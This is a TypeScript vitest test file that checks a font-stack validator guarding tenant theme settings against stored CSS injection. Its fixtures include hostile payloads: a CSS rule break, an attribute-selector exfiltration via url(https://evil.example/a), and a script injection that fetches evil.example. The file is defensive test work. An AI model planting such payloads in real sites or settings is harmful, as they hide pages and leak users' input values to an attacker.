import { describe, expect, it } from "vitest";
import { SIGNAL_TYPOGRAPHY } from "./defaults";
import { validateFontStack } from "./font-stack";

/**
 * The three payloads confirmed exploitable in the B1 code-review finding
 * (stored CSS injection via tenants.theme.font.*). The build and engine
 * suites carry the same fixtures locally — test files must not import each
 * other (vitest would double-register the imported file's tests).
 */
const HOSTILE_FONT_STACKS = [
  "Inter; } html{display:none} :root{ ",
  'x; } input[value^="a"]{background:url(https://evil.example/a)} :root{',
  'x</style><script>fetch("https://evil.example")</script>',
] as const;

describe("validateFontStack — legitimate stacks pass byte-for-byte unchanged", () => {
  it("accepts a real multi-family stack exactly as given", () => {
    const stack = '"Space Grotesk", "Helvetica Neue", Arial, sans-serif';
    expect(validateFontStack(stack, "display")).toBe(stack);
  });

  it("accepts every Signal default face", () => {
    for (const face of ["display", "body", "mono"] as const) {
      expect(validateFontStack(SIGNAL_TYPOGRAPHY[face], face)).toBe(
        SIGNAL_TYPOGRAPHY[face]
      );
    }
  });

  it("accepts non-ASCII family names, single quotes, digits, underscores", () => {
    for (const stack of [
      '"Söhne", sans-serif',
      "'GT America', 'Neue Haas Grotesk', sans-serif",
      "F37 Ginger_2, system-ui, sans-serif",
      "-apple-system, BlinkMacSystemFont, sans-serif",
    ]) {
      expect(validateFontStack(stack, "body")).toBe(stack);
    }
  });
});

describe("validateFontStack — hostile/malformed stacks are REJECTED (throw, like a malformed color)", () => {
  it.each(HOSTILE_FONT_STACKS)("rejects confirmed B1 payload %#: %s", (payload) => {
    expect(() => validateFontStack(payload, "display")).toThrow(
      /typography\.display is not a valid CSS font-family list/
    );
  });

  it("rejects every rule-breaking / escape-capable character individually", () => {
    const forbidden = [";", "{", "}", "<", ">", "(", ")", "/", "\\", ":", "\n", "\t", "\u0000", "\u00a0"];
    for (const ch of forbidden) {
      expect(() => validateFontStack(`Inter${ch}sans-serif`, "mono")).toThrow(
        /typography\.mono is not a valid CSS font-family list/
      );
    }
  });

  it("rejects url( even embedded mid-stack", () => {
    expect(() =>
      validateFontStack("Inter, url(https://evil.example/x) format", "body")
    ).toThrow(/typography\.body/);
  });

  it("names the offending characters in the error (control chars as code points)", () => {
    expect(() => validateFontStack("Inter;} x", "display")).toThrow(/";"/);
    expect(() => validateFontStack("Inter;} x", "display")).toThrow(/"\}"/);
    expect(() => validateFontStack("Inter\u0007bell", "display")).toThrow(/U\+0007/);
  });

  it("keeps the empty/non-string rejection contract", () => {
    expect(() => validateFontStack("", "body")).toThrow(/non-empty font stack/);
    expect(() => validateFontStack("   ", "body")).toThrow(/non-empty font stack/);
    expect(() => validateFontStack(42, "body")).toThrow(/non-empty font stack/);
    expect(() => validateFontStack(undefined, "body")).toThrow(/non-empty font stack/);
  });
});
